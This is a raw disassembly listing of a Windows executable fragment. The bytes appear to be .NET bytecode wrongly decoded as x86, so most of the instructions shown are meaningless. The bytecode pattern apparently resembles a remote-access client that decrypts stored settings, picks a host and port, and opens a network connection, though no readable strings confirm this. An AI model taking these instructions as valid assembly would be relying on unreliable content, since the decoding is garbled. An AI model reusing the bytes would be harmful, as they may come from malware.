  4025cc:	00 00                	add    %al,(%eax)
  4025ce:	0a 80 3b 00 00 04    	or     0x400003b(%eax),%al
  4025d4:	2a 5e 02             	sub    0x2(%esi),%bl
  4025d7:	28 1b                	sub    %bl,(%ebx)
  4025d9:	00 00                	add    %al,(%eax)
  4025db:	0a 03                	or     (%ebx),%al
  4025dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4025de:	21 00                	and    %eax,(%eax)
  4025e0:	00 0a                	add    %cl,(%edx)
  4025e2:	28 99 00 00 06 28    	sub    %bl,0x28060000(%ecx)
  4025e8:	fb                   	sti
  4025e9:	00 00                	add    %al,(%eax)
  4025eb:	0a 2a                	or     (%edx),%ch
  4025ed:	5e                   	pop    %esi
  4025ee:	28 1b                	sub    %bl,(%ebx)
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	0a 02                	or     (%edx),%al
  4025f4:	03 28                	add    (%eax),%ebp
  4025f6:	1c 00                	sbb    $0x0,%al
  4025f8:	00 0a                	add    %cl,(%edx)
  4025fa:	28 9b 00 00 06 6f    	sub    %bl,0x6f060000(%ebx)
  402600:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402605:	62 1f                	bound  %ebx,(%edi)
  402607:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40260d:	25 d0 44 00 00       	and    $0x44d0,%eax
  402612:	04 28                	add    $0x28,%al
  402614:	78 00                	js     0x402616
  402616:	00 0a                	add    %cl,(%edx)
  402618:	80 43 00 00          	addb   $0x0,0x0(%ebx)
  40261c:	04 2a                	add    $0x2a,%al
  40261e:	00 00                	add    %al,(%eax)
  402620:	1b 30                	sbb    (%eax),%esi
  402622:	03 00                	add    (%eax),%eax
  402624:	b5 00                	mov    $0x0,%ch
  402626:	00 00                	add    %al,(%eax)
  402628:	01 00                	add    %eax,(%eax)
  40262a:	00 11                	add    %dl,(%ecx)
  40262c:	16                   	push   %ss
  40262d:	0a 2b                	or     (%ebx),%ch
  40262f:	0e                   	push   %cs
  402630:	20 e8                	and    %ch,%al
  402632:	03 00                	add    (%eax),%eax
  402634:	00 28                	add    %ch,(%eax)
  402636:	14 00                	adc    $0x0,%al
  402638:	00 0a                	add    %cl,(%edx)
  40263a:	06                   	push   %es
  40263b:	17                   	pop    %ss
  40263c:	58                   	pop    %eax
  40263d:	0a 06                	or     (%esi),%al
  40263f:	7e 11                	jle    0x402652
  402641:	00 00                	add    %al,(%eax)
  402643:	04 28                	add    $0x28,%al
  402645:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  40264a:	e5 28                	in     $0x28,%eax
  40264c:	03 00                	add    (%eax),%eax
  40264e:	00 06                	add    %al,(%esi)
  402650:	2d 06 16 28 16       	sub    $0x16281606,%eax
  402655:	00 00                	add    %al,(%eax)
  402657:	0a 00                	or     (%eax),%al
  402659:	28 87 00 00 06 2d    	sub    %al,0x2d060000(%edi)
  40265f:	06                   	push   %es
  402660:	16                   	push   %ss
  402661:	28 16                	sub    %dl,(%esi)
  402663:	00 00                	add    %al,(%eax)
  402665:	0a 7e 0c             	or     0xc(%esi),%bh
  402668:	00 00                	add    %al,(%eax)
  40266a:	04 28                	add    $0x28,%al
  40266c:	17                   	pop    %ss
  40266d:	00 00                	add    %al,(%eax)
  40266f:	0a 2c 05 28 72 00 00 	or     0x7228(,%eax,1),%ch
  402676:	06                   	push   %es
  402677:	7e 04                	jle    0x40267d
  402679:	00 00                	add    %al,(%eax)
  40267b:	04 28                	add    $0x28,%al
  40267d:	17                   	pop    %ss
  40267e:	00 00                	add    %al,(%eax)
  402680:	0a 2c 05 28 70 00 00 	or     0x7028(,%eax,1),%ch
  402687:	06                   	push   %es
  402688:	7e 0f                	jle    0x402699
  40268a:	00 00                	add    %al,(%eax)
  40268c:	04 28                	add    $0x28,%al
  40268e:	17                   	pop    %ss
  40268f:	00 00                	add    %al,(%eax)
  402691:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  402694:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  40269a:	05 28 8a 00 00       	add    $0x8a28,%eax
  40269f:	06                   	push   %es
  4026a0:	28 86 00 00 06 73    	sub    %al,0x73060000(%esi)
  4026a6:	7d 00                	jge    0x4026a8
  4026a8:	00 06                	add    %al,(%esi)
  4026aa:	28 7b 00             	sub    %bh,0x0(%ebx)
  4026ad:	00 06                	add    %al,(%esi)
  4026af:	26 de 03             	fiadds %es:(%ebx)
  4026b2:	26 de 00             	fiadds %es:(%eax)
  4026b5:	28 12                	sub    %dl,(%edx)
  4026b7:	00 00                	add    %al,(%eax)
  4026b9:	06                   	push   %es
  4026ba:	2d 0a 28 1c 00       	sub    $0x1c280a,%eax
  4026bf:	00 06                	add    %al,(%esi)
  4026c1:	28 19                	sub    %bl,(%ecx)
  4026c3:	00 00                	add    %al,(%eax)
  4026c5:	06                   	push   %es
  4026c6:	73 18                	jae    0x4026e0
  4026c8:	00 00                	add    %al,(%eax)
  4026ca:	0a 20                	or     (%eax),%ah
  4026cc:	e8 03 00 00 20       	call   0x204026d4
  4026d1:	88 13                	mov    %dl,(%ebx)
  4026d3:	00 00                	add    %al,(%eax)
  4026d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4026d6:	19 00                	sbb    %eax,(%eax)
  4026d8:	00 0a                	add    %cl,(%edx)
  4026da:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026dd:	00 0a                	add    %cl,(%edx)
  4026df:	2b d4                	sub    %esp,%edx
  4026e1:	00 00                	add    %al,(%eax)
  4026e3:	00 01                	add    %al,(%ecx)
  4026e5:	10 00                	adc    %al,(%eax)
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	00 2d 00 59 86 00    	add    %ch,0x865900
  4026ef:	03 01                	add    (%ecx),%eax
  4026f1:	00 00                	add    %al,(%eax)
  4026f3:	01 1b                	add    %ebx,(%ebx)
  4026f5:	30 02                	xor    %al,(%edx)
  4026f7:	00 13                	add    %dl,(%ebx)
  4026f9:	01 00                	add    %eax,(%eax)
  4026fb:	00 02                	add    %al,(%edx)
  4026fd:	00 00                	add    %al,(%eax)
  4026ff:	11 28                	adc    %ebp,(%eax)
  402701:	1b 00                	sbb    (%eax),%eax
  402703:	00 0a                	add    %cl,(%edx)
  402705:	7e 07                	jle    0x40270e
  402707:	00 00                	add    %al,(%eax)
  402709:	04 28                	add    $0x28,%al
  40270b:	1c 00                	sbb    $0x0,%al
  40270d:	00 0a                	add    %cl,(%edx)
  40270f:	6f                   	outsl  %ds:(%esi),(%dx)
  402710:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  402715:	07                   	pop    %es
  402716:	00 00                	add    %al,(%eax)
  402718:	04 7e                	add    $0x7e,%al
  40271a:	07                   	pop    %es
  40271b:	00 00                	add    %al,(%eax)
  40271d:	04 73                	add    $0x73,%al
  40271f:	97                   	xchg   %eax,%edi
  402720:	00 00                	add    %al,(%eax)
  402722:	06                   	push   %es
  402723:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272a:	00 00                	add    %al,(%eax)
  40272c:	04 7e                	add    $0x7e,%al
  40272e:	01 00                	add    %eax,(%eax)
  402730:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402733:	9a 00 00 06 80 01 00 	lcall  $0x1,$0x80060000
  40273a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40273d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402742:	02 00                	add    (%eax),%al
  402744:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402747:	9a 00 00 06 80 02 00 	lcall  $0x2,$0x80060000
  40274e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402751:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402756:	03 00                	add    (%eax),%eax
  402758:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275b:	9a 00 00 06 80 03 00 	lcall  $0x3,$0x80060000
  402762:	00 04 7e             	add    %al,(%esi,%edi,2)
  402765:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276a:	04 00                	add    $0x0,%al
  40276c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40276f:	9a 00 00 06 80 04 00 	lcall  $0x4,$0x80060000
  402776:	00 04 7e             	add    %al,(%esi,%edi,2)
  402779:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40277e:	08 00                	or     %al,(%eax)
  402780:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402783:	9a 00 00 06 80 08 00 	lcall  $0x8,$0x80060000
  40278a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40278d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402792:	0e                   	push   %cs
  402793:	00 00                	add    %al,(%eax)
  402795:	04 6f                	add    $0x6f,%al
  402797:	9a 00 00 06 80 0e 00 	lcall  $0xe,$0x80060000
  40279e:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a1:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027a6:	0c 00                	or     $0x0,%al
  4027a8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027ab:	9a 00 00 06 80 0c 00 	lcall  $0xc,$0x80060000
  4027b2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027b5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027ba:	0f 00 00             	sldt   (%eax)
  4027bd:	04 6f                	add    $0x6f,%al
  4027bf:	9a 00 00 06 80 0f 00 	lcall  $0xf,$0x80060000
  4027c6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027c9:	7e 00                	jle    0x4027cb
  4027cb:	00 06                	add    %al,(%esi)
  4027cd:	80 10 00             	adcb   $0x0,(%eax)
  4027d0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027d3:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d8:	0a 00                	or     (%eax),%al
  4027da:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027dd:	9a 00 00 06 80 0a 00 	lcall  $0xa,$0x80060000
  4027e4:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027e7:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027ec:	09 00                	or     %eax,(%eax)
  4027ee:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f1:	9a 00 00 06 28 1c 00 	lcall  $0x1c,$0x28060000
  4027f8:	00 0a                	add    %cl,(%edx)
  4027fa:	73 1e                	jae    0x40281a
  4027fc:	00 00                	add    %al,(%eax)
  4027fe:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  402804:	28 04 00             	sub    %al,(%eax,%eax,1)
  402807:	00 06                	add    %al,(%esi)
  402809:	0a de                	or     %dh,%bl
  40280b:	05 26 16 0a de       	add    $0xde0a1626,%eax
  402810:	00 06                	add    %al,(%esi)
  402812:	2a 00                	sub    (%eax),%al
  402814:	41                   	inc    %ecx
  402815:	1c 00                	sbb    $0x0,%al
	...
  40281f:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  402822:	00 00                	add    %al,(%eax)
  402824:	0c 01                	or     $0x1,%al
  402826:	00 00                	add    %al,(%eax)
  402828:	05 00 00 00 01       	add    $0x1000000,%eax
  40282d:	00 00                	add    %al,(%eax)
  40282f:	01 1b                	add    %ebx,(%ebx)
  402831:	30 04 00             	xor    %al,(%eax,%eax,1)
  402834:	4b                   	dec    %ebx
  402835:	00 00                	add    %al,(%eax)
  402837:	00 02                	add    %al,(%edx)
  402839:	00 00                	add    %al,(%eax)
  40283b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40283e:	00 00                	add    %al,(%eax)
  402840:	04 6f                	add    $0x6f,%al
  402842:	1f                   	pop    %ds
  402843:	00 00                	add    %al,(%eax)
  402845:	0a 6f 20             	or     0x20(%edi),%ch
  402848:	00 00                	add    %al,(%eax)
  40284a:	0a 74 30 00          	or     0x0(%eax,%esi,1),%dh
  40284e:	00 01                	add    %al,(%ecx)
  402850:	28 1b                	sub    %bl,(%ebx)
  402852:	00 00                	add    %al,(%eax)
  402854:	0a 7e 07             	or     0x7(%esi),%bh
  402857:	00 00                	add    %al,(%eax)
  402859:	04 6f                	add    $0x6f,%al
  40285b:	21 00                	and    %eax,(%eax)
  40285d:	00 0a                	add    %cl,(%edx)
  40285f:	28 9f 00 00 06 72    	sub    %bl,0x72060000(%edi)
  402865:	01 00                	add    %eax,(%eax)
  402867:	00 70 28             	add    %dh,0x28(%eax)
  40286a:	22 00                	and    (%eax),%al
  40286c:	00 0a                	add    %cl,(%edx)
  40286e:	7e 0a                	jle    0x40287a
  402870:	00 00                	add    %al,(%eax)
  402872:	04 28                	add    $0x28,%al
  402874:	1c 00                	sbb    $0x0,%al
  402876:	00 0a                	add    %cl,(%edx)
  402878:	6f                   	outsl  %ds:(%esi),(%dx)
  402879:	23 00                	and    (%eax),%eax
  40287b:	00 0a                	add    %cl,(%edx)
  40287d:	0a de                	or     %dh,%bl
  40287f:	05 26 16 0a de       	add    $0xde0a1626,%eax
  402884:	00 06                	add    %al,(%esi)
  402886:	2a 00                	sub    (%eax),%al
  402888:	01 10                	add    %edx,(%eax)
  40288a:	00 00                	add    %al,(%eax)
  40288c:	00 00                	add    %al,(%eax)
  40288e:	00 00                	add    %al,(%eax)
  402890:	44                   	inc    %esp
  402891:	44                   	inc    %esp
  402892:	00 05 32 00 00 01    	add    %al,0x1000032
  402898:	13 30                	adc    (%eax),%esi
  40289a:	01 00                	add    %eax,(%eax)
  40289c:	97                   	xchg   %eax,%edi
  40289d:	00 00                	add    %al,(%eax)
  40289f:	00 00                	add    %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	00 72 0f             	add    %dh,0xf(%edx)
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	70 80                	jo     0x40282a
  4028aa:	01 00                	add    %eax,(%eax)
  4028ac:	00 04 72             	add    %al,(%edx,%esi,2)
  4028af:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028b6:	00 04 72             	add    %al,(%edx,%esi,2)
  4028b9:	9d                   	popf
  4028ba:	01 00                	add    %eax,(%eax)
  4028bc:	70 80                	jo     0x40283e
  4028be:	03 00                	add    (%eax),%eax
  4028c0:	00 04 72             	add    %al,(%edx,%esi,2)
  4028c3:	50                   	push   %eax
  4028c4:	02 00                	add    (%eax),%al
  4028c6:	70 80                	jo     0x402848
  4028c8:	04 00                	add    $0x0,%al
  4028ca:	00 04 72             	add    %al,(%edx,%esi,2)
  4028cd:	03 03                	add    (%ebx),%eax
  4028cf:	00 70 80             	add    %dh,-0x80(%eax)
  4028d2:	05 00 00 04 72       	add    $0x72040000,%eax
  4028d7:	17                   	pop    %ss
  4028d8:	03 00                	add    (%eax),%eax
  4028da:	70 80                	jo     0x40285c
  4028dc:	06                   	push   %es
  4028dd:	00 00                	add    %al,(%eax)
  4028df:	04 72                	add    $0x72,%al
  4028e1:	2d 03 00 70 80       	sub    $0x80700003,%eax
  4028e6:	07                   	pop    %es
  4028e7:	00 00                	add    %al,(%eax)
  4028e9:	04 72                	add    $0x72,%al
  4028eb:	87 03                	xchg   %eax,(%ebx)
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	08 00                	or     %al,(%eax)
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	3a 04 00             	cmp    (%eax,%eax,1),%al
  4028f8:	70 80                	jo     0x40287a
  4028fa:	09 00                	or     %eax,(%eax)
  4028fc:	00 04 72             	add    %al,(%edx,%esi,2)
  4028ff:	95                   	xchg   %eax,%ebp
  402900:	16                   	push   %ss
  402901:	00 70 80             	add    %dh,-0x80(%eax)
  402904:	0a 00                	or     (%eax),%al
  402906:	00 04 72             	add    %al,(%edx,%esi,2)
  402909:	48                   	dec    %eax
  40290a:	1e                   	push   %ds
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	0c 00                	or     $0x0,%al
  402910:	00 04 72             	add    %al,(%edx,%esi,2)
  402913:	fb                   	sti
  402914:	1e                   	push   %ds
  402915:	00 70 80             	add    %dh,-0x80(%eax)
  402918:	0e                   	push   %cs
  402919:	00 00                	add    %al,(%eax)
  40291b:	04 72                	add    $0x72,%al
  40291d:	ae                   	scas   %es:(%edi),%al
  40291e:	1f                   	pop    %ds
  40291f:	00 70 80             	add    %dh,-0x80(%eax)
  402922:	0f 00 00             	sldt   (%eax)
  402925:	04 72                	add    $0x72,%al
  402927:	61                   	popa
  402928:	20 00                	and    %al,(%eax)
  40292a:	70 80                	jo     0x4028ac
  40292c:	10 00                	adc    %al,(%eax)
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	63 20                	arpl   %esp,(%eax)
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	11 00                	adc    %eax,(%eax)
  402938:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40293b:	00 1b                	add    %bl,(%ebx)
  40293d:	30 07                	xor    %al,(%edi)
  40293f:	00 9e 02 00 00 03    	add    %bl,0x3000002(%esi)
  402945:	00 00                	add    %al,(%eax)
  402947:	11 18                	adc    %ebx,(%eax)
  402949:	17                   	pop    %ss
  40294a:	1c 73                	sbb    $0x73,%al
  40294c:	24 00                	and    $0x0,%al
  40294e:	00 0a                	add    %cl,(%edx)
  402950:	25 20 00 c8 00       	and    $0xc80020,%eax
  402955:	00 6f 25             	add    %ch,0x25(%edi)
  402958:	00 00                	add    %al,(%eax)
  40295a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402960:	00 6f 26             	add    %ch,0x26(%edi)
  402963:	00 00                	add    %al,(%eax)
  402965:	0a 28                	or     (%eax),%ch
  402967:	07                   	pop    %es
  402968:	00 00                	add    %al,(%eax)
  40296a:	06                   	push   %es
  40296b:	7e 0e                	jle    0x40297b
  40296d:	00 00                	add    %al,(%eax)
  40296f:	04 72                	add    $0x72,%al
  402971:	67 20 00             	and    %al,(%bx,%si)
  402974:	70 28                	jo     0x40299e
  402976:	27                   	daa
  402977:	00 00                	add    %al,(%eax)
  402979:	0a 39                	or     (%ecx),%bh
  40297b:	d0 00                	rolb   $1,(%eax)
  40297d:	00 00                	add    %al,(%eax)
  40297f:	7e 02                	jle    0x402983
  402981:	00 00                	add    %al,(%eax)
  402983:	04 17                	add    $0x17,%al
  402985:	8d 3a                	lea    (%edx),%edi
  402987:	00 00                	add    %al,(%eax)
  402989:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  40298f:	6f                   	outsl  %ds:(%esi),(%dx)
  402990:	28 00                	sub    %al,(%eax)
  402992:	00 0a                	add    %cl,(%edx)
  402994:	73 18                	jae    0x4029ae
  402996:	00 00                	add    %al,(%eax)
  402998:	0a 7e 02             	or     0x2(%esi),%bh
  40299b:	00 00                	add    %al,(%eax)
  40299d:	04 17                	add    $0x17,%al
  40299f:	8d 3a                	lea    (%edx),%edi
  4029a1:	00 00                	add    %al,(%eax)
  4029a3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029aa:	28 00                	sub    %al,(%eax)
  4029ac:	00 0a                	add    %cl,(%edx)
  4029ae:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4029b1:	29 00                	sub    %eax,(%eax)
  4029b3:	00 0a                	add    %cl,(%edx)
  4029b5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029bc:	17                   	pop    %ss
  4029bd:	8d 3a                	lea    (%edx),%edi
  4029bf:	00 00                	add    %al,(%eax)
  4029c1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c8:	28 00                	sub    %al,(%eax)
  4029ca:	00 0a                	add    %cl,(%edx)
  4029cc:	73 18                	jae    0x4029e6
  4029ce:	00 00                	add    %al,(%eax)
  4029d0:	0a 7e 01             	or     0x1(%esi),%bh
  4029d3:	00 00                	add    %al,(%eax)
  4029d5:	04 17                	add    $0x17,%al
  4029d7:	8d 3a                	lea    (%edx),%edi
  4029d9:	00 00                	add    %al,(%eax)
  4029db:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4029e2:	28 00                	sub    %al,(%eax)
  4029e4:	00 0a                	add    %cl,(%edx)
  4029e6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4029e9:	29 00                	sub    %eax,(%eax)
  4029eb:	00 0a                	add    %cl,(%edx)
  4029ed:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  4029f4:	06                   	push   %es
  4029f5:	28 1a                	sub    %bl,(%edx)
  4029f7:	00 00                	add    %al,(%eax)
  4029f9:	06                   	push   %es
  4029fa:	2c 42                	sub    $0x42,%al
  4029fc:	06                   	push   %es
  4029fd:	28 2a                	sub    %ch,(%edx)
  4029ff:	00 00                	add    %al,(%eax)
  402a01:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a04:	0d 2b 2c 08 09       	or     $0x9082c2b,%eax
  402a09:	9a 13 04 28 06 00 00 	lcall  $0x0,$0x6280413
  402a10:	06                   	push   %es
  402a11:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a14:	6f                   	outsl  %ds:(%esi),(%dx)
  402a15:	2b 00                	sub    (%eax),%eax
  402a17:	00 0a                	add    %cl,(%edx)
  402a19:	28 06                	sub    %al,(%esi)
  402a1b:	00 00                	add    %al,(%eax)
  402a1d:	06                   	push   %es
  402a1e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a1f:	2c 00                	sub    $0x0,%al
  402a21:	00 0a                	add    %cl,(%edx)
  402a23:	2c 05                	sub    $0x5,%al
  402a25:	dd af 00 00 00 de    	(bad) -0x22000000(%edi)
  402a2b:	03 26                	add    (%esi),%esp
  402a2d:	de 00                	fiadds (%eax)
  402a2f:	09 17                	or     %edx,(%edi)
  402a31:	58                   	pop    %eax
  402a32:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a37:	32 ce                	xor    %dh,%cl
  402a39:	38 9b 00 00 00 28    	cmp    %bl,0x28000000(%ebx)
  402a3f:	06                   	push   %es
  402a40:	00 00                	add    %al,(%eax)
  402a42:	06                   	push   %es
  402a43:	06                   	push   %es
  402a44:	07                   	pop    %es
  402a45:	6f                   	outsl  %ds:(%esi),(%dx)
  402a46:	2d 00 00 0a 38       	sub    $0x380a0000,%eax
  402a4b:	8a 00                	mov    (%eax),%al
  402a4d:	00 00                	add    %al,(%eax)
  402a4f:	73 2e                	jae    0x402a7f
  402a51:	00 00                	add    %al,(%eax)
  402a53:	0a 13                	or     (%ebx),%dl
  402a55:	05 72 61 20 00       	add    $0x206172,%eax
  402a5a:	70 72                	jo     0x402ace
  402a5c:	61                   	popa
  402a5d:	20 00                	and    %al,(%eax)
  402a5f:	70 73                	jo     0x402ad4
  402a61:	2f                   	das
  402a62:	00 00                	add    %al,(%eax)
  402a64:	0a 13                	or     (%ebx),%dl
  402a66:	06                   	push   %es
  402a67:	11 05 11 06 6f 30    	adc    %eax,0x306f0611
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	0a 11                	or     (%ecx),%dl
  402a71:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402a76:	04 6f                	add    $0x6f,%al
  402a78:	31 00                	xor    %eax,(%eax)
  402a7a:	00 0a                	add    %cl,(%edx)
  402a7c:	17                   	pop    %ss
  402a7d:	8d 39                	lea    (%ecx),%edi
  402a7f:	00 00                	add    %al,(%eax)
  402a81:	01 25 16 72 71 20    	add    %esp,0x20717216
  402a87:	00 70 a2             	add    %dh,-0x5e(%eax)
  402a8a:	16                   	push   %ss
  402a8b:	6f                   	outsl  %ds:(%esi),(%dx)
  402a8c:	32 00                	xor    (%eax),%al
  402a8e:	00 0a                	add    %cl,(%edx)
  402a90:	13 07                	adc    (%edi),%eax
  402a92:	11 07                	adc    %eax,(%edi)
  402a94:	16                   	push   %ss
  402a95:	9a 80 02 00 00 04 11 	lcall  $0x1104,$0x280
  402a9c:	07                   	pop    %es
  402a9d:	73 18                	jae    0x402ab7
  402a9f:	00 00                	add    %al,(%eax)
  402aa1:	0a 17                	or     (%edi),%dl
  402aa3:	11 07                	adc    %eax,(%edi)
  402aa5:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aa8:	19 00                	sbb    %eax,(%eax)
  402aaa:	00 0a                	add    %cl,(%edx)
  402aac:	9a 80 01 00 00 04 28 	lcall  $0x2804,$0x180
  402ab3:	06                   	push   %es
  402ab4:	00 00                	add    %al,(%eax)
  402ab6:	06                   	push   %es
  402ab7:	7e 02                	jle    0x402abb
  402ab9:	00 00                	add    %al,(%eax)
  402abb:	04 7e                	add    $0x7e,%al
  402abd:	01 00                	add    %eax,(%eax)
  402abf:	00 04 28             	add    %al,(%eax,%ebp,1)
  402ac2:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402ac7:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  402acc:	0c 11                	or     $0x11,%al
  402ace:	05 2c 07 11 05       	add    $0x511072c,%eax
  402ad3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ad4:	33 00                	xor    (%eax),%eax
  402ad6:	00 0a                	add    %cl,(%edx)
  402ad8:	dc 28                	fsubrl (%eax)
  402ada:	06                   	push   %es
  402adb:	00 00                	add    %al,(%eax)
  402add:	06                   	push   %es
  402ade:	6f                   	outsl  %ds:(%esi),(%dx)
  402adf:	2c 00                	sub    $0x0,%al
  402ae1:	00 0a                	add    %cl,(%edx)
  402ae3:	39 ec                	cmp    %ebp,%esp
  402ae5:	00 00                	add    %al,(%eax)
  402ae7:	00 17                	add    %dl,(%edi)
  402ae9:	28 13                	sub    %dl,(%ebx)
  402aeb:	00 00                	add    %al,(%eax)
  402aed:	06                   	push   %es
  402aee:	28 06                	sub    %al,(%esi)
  402af0:	00 00                	add    %al,(%eax)
  402af2:	06                   	push   %es
  402af3:	17                   	pop    %ss
  402af4:	73 34                	jae    0x402b2a
  402af6:	00 00                	add    %al,(%eax)
  402af8:	0a 16                	or     (%esi),%dl
  402afa:	14 fe                	adc    $0xfe,%al
  402afc:	06                   	push   %es
  402afd:	1b 00                	sbb    (%eax),%eax
  402aff:	00 06                	add    %al,(%esi)
  402b01:	73 35                	jae    0x402b38
  402b03:	00 00                	add    %al,(%eax)
  402b05:	0a 73 36             	or     0x36(%ebx),%dh
  402b08:	00 00                	add    %al,(%eax)
  402b0a:	0a 28                	or     (%eax),%ch
  402b0c:	09 00                	or     %eax,(%eax)
  402b0e:	00 06                	add    %al,(%esi)
  402b10:	28 08                	sub    %cl,(%eax)
  402b12:	00 00                	add    %al,(%eax)
  402b14:	06                   	push   %es
  402b15:	28 06                	sub    %al,(%esi)
  402b17:	00 00                	add    %al,(%eax)
  402b19:	06                   	push   %es
  402b1a:	6f                   	outsl  %ds:(%esi),(%dx)
  402b1b:	37                   	aaa
  402b1c:	00 00                	add    %al,(%eax)
  402b1e:	0a 6f 38             	or     0x38(%edi),%ch
  402b21:	00 00                	add    %al,(%eax)
  402b23:	0a 17                	or     (%edi),%dl
  402b25:	8d 3a                	lea    (%edx),%edi
  402b27:	00 00                	add    %al,(%eax)
  402b29:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	28 00                	sub    %al,(%eax)
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	16                   	push   %ss
  402b35:	9a 14 20 c0 00 00 00 	lcall  $0x0,$0xc02014
  402b3c:	16                   	push   %ss
  402b3d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b3e:	39 00                	cmp    %eax,(%eax)
  402b40:	00 0a                	add    %cl,(%edx)
  402b42:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b45:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b4a:	0c 00                	or     $0x0,%al
  402b4c:	00 06                	add    %al,(%esi)
  402b4e:	d4 8d                	aam    $0x8d
  402b50:	44                   	inc    %esp
  402b51:	00 00                	add    %al,(%eax)
  402b53:	01 28                	add    %ebp,(%eax)
  402b55:	0b 00                	or     (%eax),%eax
  402b57:	00 06                	add    %al,(%esi)
  402b59:	16                   	push   %ss
  402b5a:	6a 28                	push   $0x28
  402b5c:	0f 00 00             	sldt   (%eax)
  402b5f:	06                   	push   %es
  402b60:	28 80 00 00 06 28    	sub    %al,0x28060000(%eax)
  402b66:	1e                   	push   %ds
  402b67:	00 00                	add    %al,(%eax)
  402b69:	06                   	push   %es
  402b6a:	14 fe                	adc    $0xfe,%al
  402b6c:	06                   	push   %es
  402b6d:	1f                   	pop    %ds
  402b6e:	00 00                	add    %al,(%eax)
  402b70:	06                   	push   %es
  402b71:	73 3a                	jae    0x402bad
  402b73:	00 00                	add    %al,(%eax)
  402b75:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402b78:	18 00                	sbb    %al,(%eax)
  402b7a:	00 0a                	add    %cl,(%edx)
  402b7c:	20 98 3a 00 00 20    	and    %bl,0x2000003a(%eax)
  402b82:	30 75 00             	xor    %dh,0x0(%ebp)
  402b85:	00 6f 19             	add    %ch,0x19(%edi)
  402b88:	00 00                	add    %al,(%eax)
  402b8a:	0a 73 18             	or     0x18(%ebx),%dh
  402b8d:	00 00                	add    %al,(%eax)
  402b8f:	0a 20                	or     (%eax),%ah
  402b91:	98                   	cwtl
  402b92:	3a 00                	cmp    (%eax),%al
  402b94:	00 20                	add    %ah,(%eax)
  402b96:	60                   	pusha
  402b97:	ea 00 00 6f 19 00 00 	ljmp   $0x0,$0x196f0000
  402b9e:	0a 73 3b             	or     0x3b(%ebx),%dh
  402ba1:	00 00                	add    %al,(%eax)
  402ba3:	0a 28                	or     (%eax),%ch
